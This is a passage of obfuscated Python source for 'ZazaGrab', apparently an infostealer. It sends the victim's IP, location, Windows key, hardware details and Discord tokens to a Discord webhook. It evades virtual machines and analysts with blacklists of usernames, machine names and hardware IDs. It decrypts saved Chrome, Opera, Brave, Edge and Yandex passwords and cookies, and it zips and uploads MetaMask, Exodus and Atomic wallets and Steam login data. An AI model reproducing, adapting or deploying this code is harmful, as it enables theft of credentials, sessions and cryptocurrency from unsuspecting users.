        O00OO00OOOOO0OO00 ={'name':"ZazaGrab",'avatar_url':'https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg','embeds':[{'author':{'name':f'Zaza - Grab v2.1','url':'https://github.com/xKrustyDemonx','icon_url':'https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/mona-loading-dark.gif'},'color':374276 ,'description':f'[Zaza - Grab has Geo Localised this guy]({OO0O00OO00OOO000O.googlemap})','fields':[{'name':'\u200b','value':f'''```fix
                                IP:᠎ {OO0O00OO00OOO000O.ip.replace(" ", "᠎ ") if OO0O00OO00OOO000O.ip else "N/A"}
                                Org:᠎ {OO0O00OO00OOO000O.org.replace(" ", "᠎ ") if OO0O00OO00OOO000O.org else "N/A"}
                                City:᠎ {OO0O00OO00OOO000O.city.replace(" ", "᠎ ") if OO0O00OO00OOO000O.city else "N/A"}
                                Region:᠎ {OO0O00OO00OOO000O.region.replace(" ", "᠎ ") if OO0O00OO00OOO000O.region else "N/A"}
                                Country:᠎ {OO0O00OO00OOO000O.country.replace(" ", "᠎ ") if OO0O00OO00OOO000O.country else "N/A"}```
                            '''.replace (' ',''),'inline':True },{'name':'\u200b','value':f'''```fix
                                Computer Name: {vctm_pc.replace(" ", "᠎ ")}
                                Windows Key:᠎ {OO0O00OO00OOO000O.w1nk33y.replace(" ", "᠎ ")}
                                Windows Ver:᠎ {OO0O00OO00OOO000O.w1nv3r.replace(" ", "᠎ ")}
                                Disk Stockage:᠎ {d1sk}GB
                                Ram Stockage:᠎ {r4m}GB```
                            '''.replace (' ',''),'inline':True },{'name':'**- Tokens:**','value':f'''```yaml
                                {O0O00000O0O0OO00O if O0O00000O0O0OO00O else "tokens not found"}```
                            '''.replace (' ',''),'inline':False },{'name':O0OO0OO0O0OOO0000 ,'value':f'''```ini
                                [
                                {O0OO00000OOO00000.strip()}
                                ]```
                            '''.replace (' ',''),'inline':False }],'footer':{'text':'Zaza Grab Create By Soles・https://github.com/xKrustyDemonx'}}]}#line:1043
        with open (_O00O0OO0OO000OO0O ,'rb')as O0OO0O0OO0O0OO000 :#line:1046
            if OO0O00OO00OOO000O .h00ksreg in OO0O00OO00OOO000O .w3bh00k :#line:1047
                httpx .post (OO0O00OO00OOO000O .w3bh00k ,json =O00OO00OOOOO0OO00 )#line:1048
                httpx .post (OO0O00OO00OOO000O .w3bh00k ,files ={'upload_file':O0OO0O0OO0O0OO000 })#line:1049
        os .remove (_O00O0OO0OO000OO0O )#line:1050
class AntiDebug (Functions ):#line:1054
    inVM =False #line:1055
    def __init__ (OOO0O0OO00O0OOO00 ):#line:1057
        OOO0O0OO00O0OOO00 .processes =list ()#line:1058
        OOO0O0OO00O0OOO00 .bluseurs =["WDAGUtilityAccount","Robert","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl",]#line:1063
        OOO0O0OO00O0OOO00 .blpcname =["DESKTOP-CDLNVOQ","BEE7370C-8C0C-4","DESKTOP-NAKFFMT","WIN-5E07COS9ALR","B30F0242-1C6A-4","DESKTOP-VRSQLAG","Q9IATRKPRH","XC64ZB","DESKTOP-D019GDM","DESKTOP-WI8CLET","SERVER1","LISA-PC","JOHN-PC","DESKTOP-B0T93D6","DESKTOP-1PYKP29","DESKTOP-1Y2433R","WILEYPC","WORK","6C4E733F-C2D9-4","RALPHS-PC","DESKTOP-WG3MYJS","DESKTOP-7XC6GEZ","DESKTOP-5OV9S0O","QarZhrdBpj","ORELEEPC","ARCHIBALDPC","JULIA-PC","d1bnJkfVlH",]#line:1068
        OOO0O0OO00O0OOO00 .blhwid =["7AB5C494-39F5-4941-9163-47F54D6D5016","032E02B4-0499-05C3-0806-3C0700080009","03DE0294-0480-05DE-1A06-350700080009","11111111-2222-3333-4444-555555555555","6F3CA5EC-BEC9-4A4D-8274-11168F640058","ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548","4C4C4544-0050-3710-8058-CAC04F59344A","00000000-0000-0000-0000-AC1F6BD04972","79AF5279-16CF-4094-9758-F88A616D81B4","5BD24D56-789F-8468-7CDC-CAA7222CC121","49434D53-0200-9065-2500-65902500E439","49434D53-0200-9036-2500-36902500F022","777D84B3-88D1-451C-93E4-D235177420A7","49434D53-0200-9036-2500-369025000C65","B1112042-52E8-E25B-3655-6A4F54155DBF","00000000-0000-0000-0000-AC1F6BD048FE","EB16924B-FB6D-4FA1-8666-17B91F62FB37","A15A930C-8251-9645-AF63-E45AD728C20C","67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3","C7D23342-A5D4-68A1-59AC-CF40F735B363","63203342-0EB0-AA1A-4DF5-3FB37DBB0670","44B94D56-65AB-DC02-86A0-98143A7423BF","6608003F-ECE4-494E-B07E-1C4615D1D93C","D9142042-8F51-5EFF-D5F8-EE9AE3D1602A","49434D53-0200-9036-2500-369025003AF0","8B4E8278-525C-7343-B825-280AEBCD3BCB","4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",]#line:1079
        for O0OO0OO0O000OOOO0 in [OOO0O0OO00O0OOO00 .lstchec ,OOO0O0OO00O0OOO00 .regkey ,OOO0O0OO00O0OOO00 .sp3cCheq ]:#line:1081
            OO0O0OOOOO0O00OO0 =threading .Thread (target =O0OO0OO0O000OOOO0 ,daemon =True )#line:1082
            OOO0O0OO00O0OOO00 .processes .append (OO0O0OOOOO0O00OO0 )#line:1083
            OO0O0OOOOO0O00OO0 .start ()#line:1084
        for OO0000O0OOOOO0O00 in OOO0O0OO00O0OOO00 .processes :#line:1085
            try :#line:1086
                OO0000O0OOOOO0O00 .join ()#line:1087
            except RuntimeError :#line:1088
                continue #line:1089
    def programExit (O0O0O0OOOOO00O0OO ):#line:1091
        O0O0O0OOOOO00O0OO .__class__ .inVM =True #line:1092
    def lstchec (OOOO000OO0OO00OO0 ):#line:1094
        for OOOOOOOO000OO0OOO in [r'D:\Tools',r'D:\OS2',r'D:\NT3X']:#line:1095
            if ntpath .exists (OOOOOOOO000OO0OOO ):#line:1096
                OOOO000OO0OO00OO0 .programExit ()#line:1097
        for O0OO0O0000O0OOOOO in OOOO000OO0OO00OO0 .bluseurs :#line:1099
            if infocom ==O0OO0O0000O0OOOOO :#line:1100
                OOOO000OO0OO00OO0 .programExit ()#line:1101
        for O0000OOOOOO0OO00O in OOOO000OO0OO00OO0 .blpcname :#line:1103
            if vctm_pc ==O0000OOOOOO0OO00O :#line:1104
                OOOO000OO0OO00OO0 .programExit ()#line:1105
        for O0OOO000000000O00 in OOOO000OO0OO00OO0 .blhwid :#line:1107
            if OOOO000OO0OO00OO0 .sys_1fo ()[0 ]==O0OOO000000000O00 :#line:1108
                OOOO000OO0OO00OO0 .programExit ()#line:1109
    def sp3cCheq (OO0OO00O00OOO0O0O ):#line:1111
        if int (r4m )<=3 :#line:1112
            OO0OO00O00OOO0O0O .programExit ()#line:1113
        if int (d1sk )<=120 :#line:1114
            OO0OO00O00OOO0O0O .programExit ()#line:1115
        if int (psutil .cpu_count ())<=1 :#line:1116
            OO0OO00O00OOO0O0O .programExit ()#line:1117
    def regkey (O00OO000O000O00O0 ):#line:1119
        O0O0OO00OOOOO000O =os .system ("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")#line:1120
        O000O000O000OO0O0 =os .system ("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")#line:1121
        if (O0O0OO00OOOOO000O and O000O000O000OO0O0 )!=1 :#line:1122
            O00OO000O000O00O0 .programExit ()#line:1123
        OO0O0OO0O0O000O0O =winreg .OpenKey (winreg .HKEY_LOCAL_MACHINE ,'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')#line:1125
        try :#line:1126
            O00O0O00OO0O0OOO0 =winreg .QueryValueEx (OO0O0OO0O0O000O0O ,'0')[0 ]#line:1127
            if ("VMware"or "VBOX")in O00O0O00OO0O0OOO0 :#line:1128
                O00OO000O000O00O0 .programExit ()#line:1129
        finally :#line:1130
            winreg .CloseKey (OO0O0OO0O0O000O0O )#line:1131
if __name__ =="__main__"and os .name =="nt":#line:1141
    asyncio .run (bl4ckc4p ().init ())#line:1142
local =os .getenv ('LOCALAPPDATA')#line:1147
roaming =os .getenv ('APPDATA')#line:1148
temp =os .getenv ("TEMP")#line:1149
Threadlist =[]#line:1150
def fetch_conf (O0OOOOO0O00OO0O0O :str )->str or bool |None :#line:1152
        return __config__ .get (O0OOOOO0O00OO0O0O )#line:1153
hook =fetch_conf ("yourwebhookurl")#line:1155
class DATA_BLOB (Structure ):#line:1157
    _fields_ =[('cbData',wintypes .DWORD ),('pbData',POINTER (c_char ))]#line:1161
def GetData (O00O0OOO00OOOOOO0 ):#line:1163
    O0OO0O0O0O0000O00 =int (O00O0OOO00OOOOOO0 .cbData )#line:1164
    OOOOOO0O0O0O0O0O0 =O00O0OOO00OOOOOO0 .pbData #line:1165
    O0O000OOOOOOOOO0O =c_buffer (O0OO0O0O0O0000O00 )#line:1166
    cdll .msvcrt .memcpy (O0O000OOOOOOOOO0O ,OOOOOO0O0O0O0O0O0 ,O0OO0O0O0O0000O00 )#line:1167
    windll .kernel32 .LocalFree (OOOOOO0O0O0O0O0O0 )#line:1168
    return O0O000OOOOOOOOO0O .raw #line:1169
def CryptUnprotectData (OOOO0000OO00O0O00 ,entropy =b''):#line:1171
    OOOOOO0O0OO0OO000 =c_buffer (OOOO0000OO00O0O00 ,len (OOOO0000OO00O0O00 ))#line:1172
    OO0OOO00O0OO00000 =c_buffer (entropy ,len (entropy ))#line:1173
    OO0OO0O00O00O000O =DATA_BLOB (len (OOOO0000OO00O0O00 ),OOOOOO0O0OO0OO000 )#line:1174
    O0OO0O0OO0OOOO0O0 =DATA_BLOB (len (entropy ),OO0OOO00O0OO00000 )#line:1175
    O000O0O0OO0O0OO0O =DATA_BLOB ()#line:1176
    if windll .crypt32 .CryptUnprotectData (byref (OO0OO0O00O00O000O ),None ,byref (O0OO0O0OO0OOOO0O0 ),None ,None ,0x01 ,byref (O000O0O0OO0O0OO0O )):#line:1178
        return GetData (O000O0O0OO0O0OO0O )#line:1179
def DecryptValue (OOO000OO0O0O00O00 ,master_key =None ):#line:1181
    OOOO000OOOOOOO0O0 =OOO000OO0O0O00O00 .decode (encoding ='utf8',errors ='ignore')[:3 ]#line:1182
    if OOOO000OOOOOOO0O0 =='v10'or OOOO000OOOOOOO0O0 =='v11':#line:1183
        OO000O000O0OOOOOO =OOO000OO0O0O00O00 [3 :15 ]#line:1184
        O0O00O0OOOO0000O0 =OOO000OO0O0O00O00 [15 :]#line:1185
        OOOO0OOOOO0OO0O00 =AES .new (master_key ,AES .MODE_GCM ,OO000O000O0OOOOOO )#line:1186
        OO00O00OOO0O0O00O =OOOO0OOOOO0OO0O00 .decrypt (O0O00O0OOOO0000O0 )#line:1187
        OO00O00OOO0O0O00O =OO00O00OOO0O0O00O [:-16 ].decode ()#line:1188
        return OO00O00OOO0O0O00O #line:1189
def LoadRequests (OO0O0O0OO0OOOO00O ,OOO0O0OOO0O0OO0O0 ,data ='',files ='',headers =''):#line:1191
    for O00O000OO0OOOOOOO in range (8 ):#line:1192
        try :#line:1193
            if OO0O0O0OO0OOOO00O =='POST':#line:1194
                if data !='':#line:1195
                    OOOOOO0O0O0O0O00O =requests .post (OOO0O0OOO0O0OO0O0 ,data =data )#line:1196
                    if OOOOOO0O0O0O0O00O .status_code ==200 :#line:1197
                        return OOOOOO0O0O0O0O00O #line:1198
                elif files !='':#line:1199
                    OOOOOO0O0O0O0O00O =requests .post (OOO0O0OOO0O0OO0O0 ,files =files )#line:1200
                    if OOOOOO0O0O0O0O00O .status_code ==200 or OOOOOO0O0O0O0O00O .status_code ==413 :#line:1201
                        return OOOOOO0O0O0O0O00O #line:1202
        except :#line:1203
            pass #line:1204
def LoadUrlib (OO0O000OO00000O0O ,data ='',files ='',headers =''):#line:1206
    for OOO0O0000OOO0O000 in range (8 ):#line:1207
        try :#line:1208
            if headers !='':#line:1209
                O0OO0OO00OOOOO0O0 =urlopen (Request (OO0O000OO00000O0O ,data =data ,headers =headers ))#line:1210
                return O0OO0OO00OOOOO0O0 #line:1211
            else :#line:1212
                O0OO0OO00OOOOO0O0 =urlopen (Request (OO0O000OO00000O0O ,data =data ))#line:1213
                return O0OO0OO00OOOOO0O0 #line:1214
        except :#line:1215
            pass #line:1216
def Trust (O0OOOO00OOOO0OOO0 ):#line:1219
    global DETECTED #line:1220
    OOOOOO0OOO0OOOO00 =str (O0OOOO00OOOO0OOO0 )#line:1221
    O0OO00O00OO0000O0 =re .findall (".google.com",OOOOOO0OOO0OOOO00 )#line:1222
    if len (O0OO00O00OO0000O0 )<-1 :#line:1223
        DETECTED =True #line:1224
        return DETECTED #line:1225
    else :#line:1226
        DETECTED =False #line:1227
        return DETECTED #line:1228
def Reformat (O0O000OOOO00O00OO ):#line:1233
    OO0O0OO000O0O0OO0 =re .findall ("(\w+[a-z])",O0O000OOOO00O00OO )#line:1234
    while "https"in OO0O0OO000O0O0OO0 :OO0O0OO000O0O0OO0 .remove ("https")#line:1235
    while "com"in OO0O0OO000O0O0OO0 :OO0O0OO000O0O0OO0 .remove ("com")#line:1236
    while "net"in OO0O0OO000O0O0OO0 :OO0O0OO000O0O0OO0 .remove ("net")#line:1237
    return list (set (OO0O0OO000O0O0OO0 ))#line:1238
def upload (O0O0O0OOO0O000O00 ,tk =''):#line:1240
    OO0OOOOOOO0O0O0OO ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:1244
    if O0O0O0OOO0O000O00 =="zazagrabedez":#line:1246
        OOO0OO00000OOO000 ={"content":'',"embeds":[{"fields":[{"name":"Interesting files found on user PC:","value":tk }],"author":{'name':f'Zaza - Grab v2.2','url':'https://github.com/xKrustyDemonx','icon_url':'https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/mona-loading-dark.gif'},"footer":{"text":"https://github.com/xKrustyDemonx"},'color':374276 ,}],"avatar_url":"https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg","attachments":[]}#line:1270
        LoadUrlib (hook ,data =dumps (OOO0OO00000OOO000 ).encode (),headers =OO0OOOOOOO0O0O0OO )#line:1271
        return #line:1272
    O00OOO0OO00OO0O00 =O0O0O0OOO0O000O00 #line:1274
    O00OO0OOO0O0000O0 ={'file':open (O00OOO0OO00OO0O00 ,'rb')}#line:1275
    if "zg_allpasswords"in O0O0O0OOO0O000O00 :#line:1277
        OOO0O0O00OO00OO0O =' | '.join (O00OOOO0OO0OO00OO for O00OOOO0OO0OO00OO in paswWords )#line:1279
        if len (OOO0O0O00OO00OO0O )>1000 :#line:1281
            O0O00000OOO000O0O =Reformat (str (paswWords ))#line:1282
            OOO0O0O00OO00OO0O =' | '.join (OO0O00O0O000000O0 for OO0O00O0O000000O0 in O0O00000OOO000O0O )#line:1283
        OOO0OO00000OOO000 ={"content":'',"embeds":[{"fields":[{"name":"Passwords Found:","value":OOO0O0O00OO00OO0O }],"author":{'name':f'Zaza - Grab v2.2','url':'https://github.com/xKrustyDemonx','icon_url':'https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/mona-loading-dark.gif'},"footer":{"text":"github.com/xKrustyDemonx",},'color':374276 ,}],"avatar_url":"https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg","attachments":[]}#line:1308
        LoadUrlib (hook ,data =dumps (OOO0OO00000OOO000 ).encode (),headers =OO0OOOOOOO0O0O0OO )#line:1309
    if "zg_allcookies"in O0O0O0OOO0O000O00 :#line:1311
        O00O0OO000OO000O0 =' | '.join (O0OO00OOOO00O0000 for O0OO00OOOO00O0000 in cookiWords )#line:1312
        if len (O00O0OO000OO000O0 )>1000 :#line:1313
            O000O0000000O00O0 =Reformat (str (cookiWords ))#line:1314
            O00O0OO000OO000O0 =' | '.join (OOO00O0OOO0O00000 for OOO00O0OOO0O00000 in O000O0000000O00O0 )#line:1315
        OOO0OO00000OOO000 ={"content":'',"embeds":[{"fields":[{"name":"Cookies Found:","value":O00O0OO000OO000O0 }],"author":{'name':f'Zaza - Grab v2.2','url':'https://github.com/xKrustyDemonx','icon_url':'https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/mona-loading-dark.gif'},"footer":{"text":"github.com/xKrustyDemonx",},'color':374276 ,}],"avatar_url":"https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg","attachments":[]}#line:1340
        LoadUrlib (hook ,data =dumps (OOO0OO00000OOO000 ).encode (),headers =OO0OOOOOOO0O0O0OO )#line:1341
    LoadRequests ("POST",hook ,files =O00OO0OOO0O0000O0 )#line:1343
def writeforfile (OO00O0O0OO00O00O0 ,OO00O0O0000OOOOO0 ):#line:1345
    OO0OOO0O0O00OOO00 =os .getenv ("TEMP")+f"\{OO00O0O0000OOOOO0}.txt"#line:1346
    with open (OO0OOO0O0O00OOO00 ,mode ='w',encoding ='utf-8')as OOO0OOOOOO000O000 :#line:1347
        OOO0OOOOOO000O000 .write (f"Created by Soles | https://github.com/xKrustyDemonx\n\n")#line:1348
        for O0O00O0O00O0OOOOO in OO00O0O0OO00O00O0 :#line:1349
            if O0O00O0O00O0OOOOO [0 ]!='':#line:1350
                OOO0OOOOOO000O000 .write (f"{O0O00O0O00O0OOOOO}\n")#line:1351
Passw =[]#line:1355
def getPassw (O00O0000OOOOO0OO0 ,O00O00OO0OOOO0000 ):#line:1356
    global Passw #line:1357
    if not os .path .exists (O00O0000OOOOO0OO0 ):return #line:1358
    O00OOOOOO00O00OO0 =O00O0000OOOOO0OO0 +O00O00OO0OOOO0000 +"/Login Data"#line:1360
    if os .stat (O00OOOOOO00O00OO0 ).st_size ==0 :return #line:1361
    OOO000OO0O0O0O0O0 =temp +"zazagrabed"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for O0O0O0O0O0000OOOO in range (8 ))+".db"#line:1363
    shutil .copy2 (O00OOOOOO00O00OO0 ,OOO000OO0O0O0O0O0 )#line:1364
    OO00OO000000000O0 =connect (OOO000OO0O0O0O0O0 )#line:1365
    OOOO0000OO0OOOO00 =OO00OO000000000O0 .cursor ()#line:1366
    OOOO0000OO0OOOO00 .execute ("SELECT action_url, username_value, password_value FROM logins;")#line:1367
    O00O00000000O00OO =OOOO0000OO0OOOO00 .fetchall ()#line:1368
    OOOO0000OO0OOOO00 .close ()#line:1369
    OO00OO000000000O0 .close ()#line:1370
    os .remove (OOO000OO0O0O0O0O0 )#line:1371
    OOOOO0O000O00000O =O00O0000OOOOO0OO0 +"/Local State"#line:1373
    with open (OOOOO0O000O00000O ,'r',encoding ='utf-8')as O00OO00OOOO00OO00 :OO00OOOO0O0OO0O00 =loads (O00OO00OOOO00OO00 .read ())#line:1374
    O0OO00OOOOOOOO0O0 =b64decode (OO00OOOO0O0OO0O00 ['os_crypt']['encrypted_key'])#line:1375
    O0OO00OOOOOOOO0O0 =CryptUnprotectData (O0OO00OOOOOOOO0O0 [5 :])#line:1376
    for OO0O0OO00O00O0O00 in O00O00000000O00OO :#line:1378
        if OO0O0OO00O00O0O00 [0 ]!='':#line:1379
            for OO0000O0OO0O0O0OO in keyword :#line:1380
                OOO00O00O00000OO0 =OO0000O0OO0O0O0OO #line:1381
                if "https"in OO0000O0OO0O0O0OO :#line:1382
                    OO000OOO00O00000O =OO0000O0OO0O0O0OO #line:1383
                    OO0000O0OO0O0O0OO =OO000OOO00O00000O .split ('[')[1 ].split (']')[0 ]#line:1384
                if OO0000O0OO0O0O0OO in OO0O0OO00O00O0O00 [0 ]:#line:1385
                    if not OOO00O00O00000OO0 in paswWords :paswWords .append (OOO00O00O00000OO0 )#line:1386
            Passw .append (f"URL: {OO0O0OO00O00O0O00[0]} \n ID: {OO0O0OO00O00O0O00[1]} \n PASSW0RD: {DecryptValue(OO0O0OO00O00O0O00[2], O0OO00OOOOOOOO0O0)}\n\n")#line:1387
    writeforfile (Passw ,'zg_allpasswords')#line:1388
Cookies =[]#line:1390
def getCookie (OOOO0O0OO0OOO0000 ,OOO00O00OO00O00OO ):#line:1391
    global Cookies #line:1392
    if not os .path .exists (OOOO0O0OO0OOO0000 ):return #line:1393
    OOOO0000OOOOO0OO0 =OOOO0O0OO0OOO0000 +OOO00O00OO00O00OO +"/Cookies"#line:1395
    if os .stat (OOOO0000OOOOO0OO0 ).st_size ==0 :return #line:1396
    O00OO0O0OOO0O00OO =temp +"zazagrabed"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for O0O00000OOO00O0OO in range (8 ))+".db"#line:1398
    shutil .copy2 (OOOO0000OOOOO0OO0 ,O00OO0O0OOO0O00OO )#line:1400
    OOO0O0000O0O0O000 =connect (O00OO0O0OOO0O00OO )#line:1401
    OO00O0OO000OO0O00 =OOO0O0000O0O0O000 .cursor ()#line:1402
    OO00O0OO000OO0O00 .execute ("SELECT host_key, name, encrypted_value FROM cookies")#line:1403
    OO0OO0O0O000O0O0O =OO00O0OO000OO0O00 .fetchall ()#line:1404
    OO00O0OO000OO0O00 .close ()#line:1405
    OOO0O0000O0O0O000 .close ()#line:1406
    os .remove (O00OO0O0OOO0O00OO )#line:1407
    OOO000000OOO000O0 =OOOO0O0OO0OOO0000 +"/Local State"#line:1409
    with open (OOO000000OOO000O0 ,'r',encoding ='utf-8')as OO0OOO000O0O0OOO0 :O0O000OO0O000O00O =loads (OO0OOO000O0O0OOO0 .read ())#line:1411
    OO0O0OOOOO000OO00 =b64decode (O0O000OO0O000O00O ['os_crypt']['encrypted_key'])#line:1412
    OO0O0OOOOO000OO00 =CryptUnprotectData (OO0O0OOOOO000OO00 [5 :])#line:1413
    for OO000000OOO00OOO0 in OO0OO0O0O000O0O0O :#line:1415
        if OO000000OOO00OOO0 [0 ]!='':#line:1416
            for OOO00OO0OOO0OOOOO in keyword :#line:1417
                OO0OO0OOO0OO0O0OO =OOO00OO0OOO0OOOOO #line:1418
                if "https"in OOO00OO0OOO0OOOOO :#line:1419
                    OOO000OOO0O00O0O0 =OOO00OO0OOO0OOOOO #line:1420
                    OOO00OO0OOO0OOOOO =OOO000OOO0O00O0O0 .split ('[')[1 ].split (']')[0 ]#line:1421
                if OOO00OO0OOO0OOOOO in OO000000OOO00OOO0 [0 ]:#line:1422
                    if not OO0OO0OOO0OO0O0OO in cookiWords :cookiWords .append (OO0OO0OOO0OO0O0OO )#line:1423
            Cookies .append (f" HOST KEY: {OO000000OOO00OOO0[0]} | NAME: {OO000000OOO00OOO0[1]} | VALUE: {DecryptValue(OO000000OOO00OOO0[2], OO0O0OOOOO000OO00)}")#line:1424
    writeforfile (Cookies ,'zg_allcookies')#line:1425
def checkIfProcessRunning (O0O00OO00000OOO00 ):#line:1427
    ""#line:1430
    for O000000O0O0OO0O0O in psutil .process_iter ():#line:1432
        try :#line:1433
            if O0O00OO00000OOO00 .lower ()in O000000O0O0OO0O0O .name ().lower ():#line:1435
                return True #line:1436
        except (psutil .NoSuchProcess ,psutil .AccessDenied ,psutil .ZombieProcess ):#line:1437
            pass #line:1438
    return False ;#line:1439
def ZipThings (O0O00OO00O000OO00 ,O00000OO0000O0000 ,OOOOOO00000OO000O ):#line:1442
    O00000OO00OO00O00 =O0O00OO00O000OO00 #line:1443
    O0OO0000O0O0OO0OO =O00000OO0000O0000 #line:1444
    if "nkbihfbeogaeaoehlefnkodbefgpgknn"in O00000OO0000O0000 :#line:1446
        O00OO00O00O000O0O =O0O00OO00O000OO00 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:1447
        O0OO0000O0O0OO0OO =f"Metamask_{O00OO00O00O000O0O}"#line:1448
        O00000OO00OO00O00 =O0O00OO00O000OO00 +O00000OO0000O0000 #line:1449
    if not os .path .exists (O00000OO00OO00O00 ):return #line:1451
    if checkIfProcessRunning ('chrome.exe'):#line:1452
        print ('Yes a chrome process was running')#line:1453
        subprocess .Popen (f"taskkill /im {OOOOOO00000OO000O} /t /f",shell =True )#line:1454
    else :#line:1455
        ...#line:1456
    if "Wallet"in O00000OO0000O0000 or "NationsGlory"in O00000OO0000O0000 :#line:1459
        O00OO00O00O000O0O =O0O00OO00O000OO00 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:1460
        O0OO0000O0O0OO0OO =f"{O00OO00O00O000O0O}"#line:1461
    elif "Steam"in O00000OO0000O0000 :#line:1463
        if not os .path .isfile (f"{O00000OO00OO00O00}/loginusers.vdf"):return #line:1464
        O0O0000O0OOOO0OOO =open (f"{O00000OO00OO00O00}/loginusers.vdf","r+",encoding ="utf8")#line:1465
        OOO000O0000O00OO0 =O0O0000O0OOOO0OOO .readlines ()#line:1466
        O000OO0OO0OOOO0O0 =False #line:1467
        for OO00OO0OOOO0000O0 in OOO000O0000O00OO0 :#line:1468
            if 'RememberPassword"\t\t"1"'in OO00OO0OOOO0000O0 :#line:1469
                O000OO0OO0OOOO0O0 =True #line:1470
        if O000OO0OO0OOOO0O0 ==False :return #line:1471
        O0OO0000O0O0OO0OO =O00000OO0000O0000 #line:1472
    OO0OO00OO000OO000 =zipfile .ZipFile (f"{O00000OO00OO00O00}/{O0OO0000O0O0OO0OO}.zip","w")#line:1474
    print (OO0OO00OO000OO000 )#line:1475
    for O0OO00OO00O0OO0O0 in os .listdir (O00000OO00OO00O00 ):#line:1476
        if not ".zip"in O0OO00OO00O0OO0O0 :OO0OO00OO000OO000 .write (O00000OO00OO00O00 +"/"+O0OO00OO00O0OO0O0 )#line:1477
    OO0OO00OO000OO000 .close ()#line:1478
    upload (f'{O00000OO00OO00O00}/{O0OO0000O0O0OO0OO}.zip')#line:1480
    os .remove (f"{O00000OO00OO00O00}/{O0OO0000O0O0OO0OO}.zip")#line:1481
def GatherAll ():#line:1484
    ""#line:1485
    OOOOO000OOOO0O0OO =[[f"{roaming}/Opera Software/Opera GX Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Neon/User Data/Default","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome SxS/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/BraveSoftware/Brave-Browser/User Data","brave.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Yandex/YandexBrowser/User Data","yandex.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Microsoft/Edge/User Data","edge.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"]]#line:1495
    O000OOOO00O0O0O0O =[[f"{roaming}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',"Wallet"],[f"{roaming}/Exodus/exodus.wallet","Exodus.exe","Wallet"],["C:\Program Files (x86)\Steam\config","steam.exe","Steam"],[f"{roaming}/NationsGlory/Local Storage/leveldb","NationsGlory.exe","NationsGlory"]]#line:1504
    for OO0OO000O0OOOOOOO in OOOOO000OOOO0O0OO :#line:1507
        O0OOO00OOO0OO0O0O =threading .Thread (target =getPassw ,args =[OO0OO000O0OOOOOOO [0 ],OO0OO000O0OOOOOOO [3 ]])#line:1508
        O0OOO00OOO0OO0O0O .start ()#line:1509
        Threadlist .append (O0OOO00OOO0OO0O0O )#line:1510
    O0O00OOOO00000OO0 =[]#line:1512
    for OO0OO000O0OOOOOOO in OOOOO000OOOO0O0OO :#line:1513
        O0OOO00OOO0OO0O0O =threading .Thread (target =getCookie ,args =[OO0OO000O0OOOOOOO [0 ],OO0OO000O0OOOOOOO [4 ]])#line:1514
        O0OOO00OOO0OO0O0O .start ()#line:1515
        O0O00OOOO00000OO0 .append (O0OOO00OOO0OO0O0O )#line:1516
    for O000O0OO00OOOOO00 in O0O00OOOO00000OO0 :O000O0OO00OOOOO00 .join ()#line:1518
    O0OO00O00000O000O =Trust (Cookies )#line:1519
    if O0OO00O00000O000O ==True :return #line:1520
    for OO0OO000O0OOOOOOO in OOOOO000OOOO0O0OO :#line:1522
        threading .Thread (target =ZipThings ,args =[OO0OO000O0OOOOOOO [0 ],OO0OO000O0OOOOOOO [5 ],OO0OO000O0OOOOOOO [1 ]]).start ()#line:1523
    for OO0OO000O0OOOOOOO in O000OOOO00O0O0O0O :#line:1525
        threading .Thread (target =ZipThings ,args =[OO0OO000O0OOOOOOO [0 ],OO0OO000O0OOOOOOO [2 ],OO0OO000O0OOOOOOO [1 ]]).start ()#line:1526
    for O000O0OO00OOOOO00 in Threadlist :#line:1528
        O000O0OO00OOOOO00 .join ()#line:1529
